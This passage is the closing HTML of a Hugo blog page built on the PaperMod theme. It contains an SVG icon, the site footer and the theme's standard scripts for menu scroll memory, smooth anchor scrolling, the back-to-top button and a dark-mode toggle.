xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://hxuu.github.io/blog/>hxuu</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>